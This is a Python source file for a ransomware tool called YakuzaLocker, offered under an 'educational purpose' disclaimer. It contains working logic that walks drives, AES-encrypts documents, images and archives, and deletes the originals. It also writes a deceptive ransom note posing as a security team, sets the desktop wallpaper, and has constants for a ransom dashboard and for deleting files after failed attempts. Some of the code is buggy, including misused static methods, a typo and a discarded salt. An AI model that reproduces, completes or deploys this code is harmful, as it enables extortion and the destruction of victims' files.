"""Main file of YakuzaLocker
Main file to Combine all Components of YakuzaLocker together
Author: Yakuza-D
Disclaimer: this app written only and only for educational purpose
"""

import ctypes
import logging
import os
import sys
import uuid
from os import makedirs
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from base64 import b64encode

""" Part 1: Application functions """


# Defining Function to load the current path of ransom.py and then join it to relative_path
def resource_path(relative_path):
    # Get Directory name of the current python file
    basePath = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))

    # join relative_path to directory name of the current python file
    return os.path.join(basePath, relative_path)


# Create Function to Ensure the time Directory Exist
def ensure_time_dir_exist():
    if not os.path.exists(TIME_DIR):
        os.makedirs(TIME_DIR)


# Create Function to Load Machine ID from all drives on the machine
def load_machine_id():
    # Generate a list of all existence drives on the machine
    drives = [f"{x}:\\" for x in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{x}:\\")]

    # Iterate through each drive and check if the Machine_id.txt file exists, then read its contents and return it
    for drive in drives:
        machineIdPath = os.path.join(drive, 'Machine_id.txt')
        if os.path.exists(machineIdPath):
            try:
                with open(machineIdPath, 'r') as file:
                    machineId = file.read().strip()
                    # debug print
                    print(f"[+] Debug: Machine Id loaded successfully from {machineIdPath}: {machineId}")
                    return machineId
            except FileNotFoundError:
                continue
    # debug print
    print(f"[-] Debug: Can't load machine id's, No valid Machine ID found. ")
    return None


""" Part 2: Define Global constants """
TERMINATION_KEY = "bingo"  # Termination keys used to close app and cancel Deleting Operation
# TERMINATION_KEY = "yakuza"
SECONDARY_TERMINATION_KEY = "stop"
# SECONDARY_TERMINATION_KEY = "davood"

# get the current user's home directory
HOME_DIR = os.path.expanduser('~')

# Create Path of Time Directory based on the current user's home directory
TIME_DIR = os.path.join(HOME_DIR, '.cryptolock_time')  # TIME_DIR = os.path.join(HOME_DIR, '.yakuzalock_time')

# Create Path of a timer state file(timer_state.txt) which store in the TIME_DIR
TIMER_STATE_FILE = os.path.join(TIME_DIR, 'timer_state.txt')

# Path of application icons and images
ICON_PATH = resource_path("img/app_icon.ico")
LOGO_PATH = resource_path("img/logo.png")
THANKS_PATH = resource_path("img/thank_you.png")

""" Part 3: Define Encryption Configs as Global Constants """

# Ensure the time Directory Exists at the Start & Encryption Configs
ensure_time_dir_exist()

# You can customize choose the drives you want to encrypt
DRIVES_TO_ENCRYPT = ["F:", "E:"]

# File Extension to be encrypted, File Extension's can be customized based on a yor target
EXTENSION_TO_ENCRYPT = [".txt", ".jpg", ".png", ".pdf", ".zip", ".rar", ".xlsx", ".docx"]

# Password_PROVIDED used for Encryption Salt to Encryption be stronger
PASSWORD_PROVIDED = "PleaseGiveMeMoney"

# URL of Web Panel(Dashboard) of Ransom Tool
DASHBOARD_URL = "http://localhost/"

# Max Attempt to Enter a decryption key before deleting all encrypted Files
MAX_ATTEMPTS = 10

# Delay between each round of encrypted files Deleting
DELAY = 5

"""  Part 4: Setup Logging to Log the Encryption/Decryption Process in the Log Console """
logging.basicConfig(
    filename="encryption_log.txt",
    level=logging.INFO,
    format="%(asctime)s:%(levelname)s:%(message)s",
    filemode="w"
)

consoleHandler = logging.StreamHandler()
consoleHandler.setLevel(logging.INFO)
formatter = logging.Formatter("%(asctime)s:%(levelname)s:%(message)s")
consoleHandler.setFormatter(formatter)
logging.getLogger().addHandler(consoleHandler)


# Initialize Encryption Tool Class
class EncryptionTool:
    def __init__(self, drives, extensions, password, dashboard_url, max_attempts=10, delay=5):
        self.drives = drives
        self.extensions = extensions
        self.password = password
        self.dashboard_url = dashboard_url
        self.max_attempts = max_attempts
        self.delay = delay
        self.key = self.generate_key(password)
        self.machine_id = str(uuid.uuid4())

    @staticmethod
    def generate_key(self, password):
        """ this function generates a key from the password as argument which is PASSWORD_PROVIDED
        :param: password
        :return: key
        """
        try:
            # Create 16 bytes Salt
            salt = get_random_bytes(16)

            # Create PBKDF2 Password with salt in 32 bytes
            key = PBKDF2(password.encode(), salt, dkLen=32, count=1000000)

            # Submit a info log message in Log Console
            logging.info("[+] Encryption: Encryption Key Generated Successfully. ")
            return key

        except Exception as e:
            # Submit a Error log message in Log Console
            logging.error(f"[-] Encryption: Encryption Key Generation Failed: Error {str(e)}")
            raise

    # Create Function to Set Wallpaper on the target machine after ransom running
    @staticmethod
    def set_wallpaper(self, path):
        try:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
            logging.info(f"[+] Wallpaper Set Successfully to {path}. ")
        except Exception as e:
            logging.error(f"[-] Failed to set Wallpaper => Error: {str(e)}")

    # Function to Create Important Files on the target machine
    @staticmethod
    def create_important_files(directory_path):
        try:
            # Create a path of D-Data and then Create it if the D-Data directory doesn't exist
            dDataPath = os.path.join(directory_path, "D-Data")
            os, makedirs(dDataPath, exist_ok=True)

            # Filenames must be created with fileContents
            filenames = ['Annual_Report_2022.docx', 'Financials_Q3.xlsx', 'Employee_Contacts.pdf']
            fileContents = ['Annual Report Content', 'Financial Data', 'Employee Contact Information']

            # Iterate on all filenames and file contents
            for filename, content in zip(filenames, fileContents):
                # join the filename path to the D-Data Directory path
                filepath = os.path.join(dDataPath, filename)

                # Create filename(important files) in the D-Data Directory
                with open(filepath, 'w') as file:
                    file.write(content)

            # Submit an Info Log message of Important files created
            logging.info(f"[+] Important Files Created Successfully in {dDataPath}.")
        except Exception as e:
            # Submit Error Log message from exception occurs
            logging.error(f"[-] Failed to create important files => Error: {str(e)}")

    # Create Function to Encrypt a Single File
    def encrypt_file(self, file_path):
        try:
            # Generate a 16-byte IV
            iv = get_random_bytes(16)

            # Create a Cipher object with key+iv on CBC Mode
            cipher = AES.new(self.key, AES.MODE_CBC, iv)

            # Open file_path in Read Binary Mode and then read file contents
            with open(file_path, 'rb') as file:
                fileData = file.read()

            # Encrypt fileData using the Cipher object with AES Algorithm
            encryptedData = cipher.encrypt(pad(fileData, AES.block_size))

            # Write the encryptedData + iv to a new file with .encrypted Extension
            with open(file_path + ".encrypted", 'wb') as file:
                file.write(iv + encryptedData)

            # Remove the Original file from target machine
            os.remove(file_path)

            # Submit an Info Log from encryption to Log Console
            logging.info(f"[+] Encrypting {file_path} ...")
        except Exception as e:
            # Submit an Error Log from encryption to Log Console
            logging.error(f"[-] Failed to encrypt {file_path} => Error: {str(e)}")

    # Function to Encrypt All Files in a Directory
    def encrypt_files_in_directory(self, directory_path):
        try:
            # Split root(parents) directory, directory and files in directory
            for root, dirs, files in os.walk(directory_path):

                # If the directory uses fore recycle bin, jump to for loop
                if "$RECYCLE.BIN" in root:
                    continue

                # Iterate on all files in directory, for each file in directory
                for file in files:
                    # if a file ends with each item defined in the extension list, then join filename to the root folder
                    # and then encrypt file using single file encrypt function => encrypt_file()

                    if any(file.endswith(ext) for ext in self.extensions):
                        # join a file to the root directory and then encrypt file using single file encrypt function
                        filePath = os.path.join(root, file)
                        self.encrypt_file(filePath)

            # Submit Info Log for files encryption in the Log Console
            logging.info(f"[+] All files in the {directory_path} Encrypted Successfully.")
        except Exception as e:
            # Submit Error Log for files encryption in the Log Console
            logging.error(f"[-] Failed to Encrypt files in {directory_path} => Error: {str(e)}")

    # Function to create a user manual
    def create_user_manual(self, directory_path):
        manualContent = f"""Dear User,
Your files have been secured at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} with a unique machine ID: {self.machine_id}
Please keep this machine ID safe. You will need it along with your decryption key to unlock your files.
In case of any issues or to obtain your decryption key, please contact your IT department or your system administrator for further details.
Thank you,
Your Security Team
"""
        manualPath = os.path.join(directory_path, "READ_ME_FOR_DECRYPTION.txt")
        try:
            with open(manualPath, "w") as file:
                file.write(manualContent)
            logging.info(f"[+] User Manual Created Successfully in {directory_path}.")
        except Exception as e:
            logging.error(f"[-] Failed to create user manual. Error: {str(e)}")

    # Function to save the encryption key locally
    def save_key_locally(self):
        # Create Hardcoded Path for saving key
        keyPath = os.path.join('E:', 'encryption_key.txt')
        try:
            os.makedirs(os.path.dirname(keyPath), exist_ok=True)

            # Write Machine id & Encryption key to keyPath file
            with open(keyPath, "w") as file:
                file.write(f"Machine ID: {self.machine_id}\n")
                file.write(f"Encryption Key: {b64encode(self.key).decode('utf-8')}\n")

            # Submit Info Log for the encryption key and the machine id saving
            logging.info(f"[+] Encryption Key Saved Locally in the {keyPath}.")
            return True
        except Exception as e:
            # Submit Error Log for Failed the encryption key and the machine id saving
            logging.error(f"[-] Failed to save the encryption key locally. Error: {str(e)}")
            return False


    # Function to save the machine ID
    def save_machine_id(self, directory_path):
        # Create Hardcoded Path for Machine_id.txt which store the machine id
        machineIdPath = os.path.join(directory_path, "Machine_id.txt")
        try:
            # Create directory_path if the directory doesn't exist
            os.makedirs(directory_path, exist_ok=True)

            # Open Machine_id.txt and write 'self.machine_id' to this file
            with open(machineIdPath, "w") as file:
                file.write(self.machine_id)

            # Submit Info Log for saving machine ID
            logging.info(f"[+] Machine ID Saved Successfully in {machineIdPath}.")

        except Exception as e:
            # Submit Error Log for Failed the encryption key and the machine id saving
            logging.error(f"[-] Failed to save the Machine ID locally. Error: {str(e)}")
            return False


    # Function to process a drive (create files, encrypt, etc.)
    def process_drive(self, drive):
        self.create_important_files(drive)
        self.encrypt_files_in_directory(drive)
        self.create_user_manual(drive)
        self.save_machine_id(drive)








if __name__ == "__main__":
    # Create an instance of the EncryptionTool class
    encryptionTool = EncryptionTool(drives=DRIVES_TO_ENCRYPT, extensions=EXTENSION_TO_ENCRYPT,
                                    password=PASSWORD_PROVIDED, dashboard_url=DASHBOARD_URL)
    encryptionTool.create_important_files(r"H:/Repo/RansomPOC")
    encryptionTool.encrypt_files_in_directory(r"H:/Repo/RansomPOC/D-Data")

